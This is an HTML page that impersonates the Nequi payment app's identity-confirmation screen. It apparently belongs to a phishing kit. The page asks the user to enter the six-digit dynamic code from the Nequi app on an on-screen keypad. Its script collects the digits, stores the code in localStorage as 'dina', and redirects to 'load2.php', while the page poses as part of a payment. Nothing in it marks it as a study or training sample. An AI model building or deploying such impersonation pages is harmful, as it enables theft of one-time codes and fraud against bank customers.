<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Confirmar Identidad - Nequi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    :root {
      --purple-primary: #200020;
      --pink-primary: #da0081;
      --white: #ffffff;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Manrope', system-ui, sans-serif;
    }

    body {
      background: var(--white);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .homeSectionContainer {
      max-width: 420px;
      width: 100%;
      text-align: center;
    }

    .homeSectionContainer img.logo {
      width: 150px;
      margin-bottom: 40px;
    }

    h1 {
      font-size: 1.5rem;
      color: var(--purple-primary);
      margin-bottom: 10px;
    }

    p {
      font-size: 0.9rem;
      color: var(--purple-primary);
      margin-bottom: 28px;
    }

    .linesContainer {
      display: flex;
      justify-content: space-between;
      max-width: 260px;
      margin: 0 auto 30px;
    }

    .otpInput {
      width: 32px;
      height: 40px;
      border: none;
      border-bottom: 2px solid var(--purple-primary);
      text-align: center;
      font-size: 2rem;
      color: var(--pink-primary);
      font-weight: bold;
      background: none;
    }

    .otpInput:focus {
      outline: none;
    }

    .screenKeyboard {
      width: 100%;
      max-width: 280px;
      margin: 0 auto;
    }

    .keyboardRow {
      display: flex;
      justify-content: space-around;
      margin-bottom: 1.2rem;
    }

    .keyboardBtn {
      width: 60px;
      height: 60px;
      border: none;
      background: none;
      font-size: 2.2rem;
      color: var(--purple-primary);
      cursor: pointer;
      border-radius: 50%;
      transition: background-color 0.2s ease;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .keyboardBtn:hover {
      background-color: rgba(0,0,0,0.05);
    }

    .keyboardBtn img {
      width: 38px;
      height: 38px;
    }

    .cancelBtn {
      margin-top: 30px;
      width: 100%;
      max-width: 260px;
      padding: 12px;
      border: 2px solid var(--purple-primary);
      background: var(--white);
      color: var(--purple-primary);
      border-radius: 10px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    .cancelBtn:hover {
      background-color: #f9f5fa;
    }
  </style>
</head>

<body>
  <section class="homeSectionContainer">
    <img src="logo.png" alt="Logo Nequi" class="logo" />
    <h1>Confirma tu identidad</h1>
    <p>Para confirmar tu identidad, escribe la clave dinámica que encuentras en tu App Nequi.</p>

    <!-- CAMPOS OTP -->
    <div class="linesContainer">
      <input id="c1" class="otpInput" maxlength="1" readonly>
      <input id="c2" class="otpInput" maxlength="1" readonly>
      <input id="c3" class="otpInput" maxlength="1" readonly>
      <input id="c4" class="otpInput" maxlength="1" readonly>
      <input id="c5" class="otpInput" maxlength="1" readonly>
      <input id="c6" class="otpInput" maxlength="1" readonly>
    </div>

    <!-- TECLADO NUMÉRICO -->
    <div class="screenKeyboard">
      <div class="keyboardRow">
        <button class="keyboardBtn">1</button>
        <button class="keyboardBtn">2</button>
        <button class="keyboardBtn">3</button>
      </div>
      <div class="keyboardRow">
        <button class="keyboardBtn">4</button>
        <button class="keyboardBtn">5</button>
        <button class="keyboardBtn">6</button>
      </div>
      <div class="keyboardRow">
        <button class="keyboardBtn">7</button>
        <button class="keyboardBtn">8</button>
        <button class="keyboardBtn">9</button>
      </div>
      <div class="keyboardRow">
        <button class="keyboardBtn invisible" disabled></button>
        <button class="keyboardBtn">0</button>
        <button class="keyboardBtn" id="delete-otp">
          <img src="borrar.webp" alt="Borrar">
        </button>
      </div>
    </div>

    <button class="cancelBtn" onclick="window.location.href='index.php'">Cancelar el pago</button>
  </section>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const inputs = document.querySelectorAll('.otpInput');
      const keyboard = document.querySelector('.screenKeyboard');
      const deleteBtn = document.getElementById('delete-otp');
      let currentInput = 0;

      keyboard.addEventListener('click', (e) => {
        const btn = e.target.closest('.keyboardBtn');
        if (!btn || btn.disabled || btn.id === 'delete-otp') return;

        const valor = btn.textContent.trim();
        if (currentInput < inputs.length) {
          inputs[currentInput].value = '*';
          inputs[currentInput].dataset.realValue = valor;
          currentInput++;
          checkComplete();
        }
      });

      deleteBtn.addEventListener('click', () => {
        if (currentInput > 0) {
          currentInput--;
          inputs[currentInput].value = '';
          delete inputs[currentInput].dataset.realValue;
        }
      });

      inputs.forEach(input => {
        input.readOnly = true;
        input.addEventListener('keydown', e => e.preventDefault());
      });

      function checkComplete() {
        if (currentInput === inputs.length) {
          let code = '';
          inputs.forEach(inp => code += inp.dataset.realValue || '');
          localStorage.setItem("dina", code);
          window.location.href = "load2.php";
        }
      }
    });
  </script>
</body>
</html>
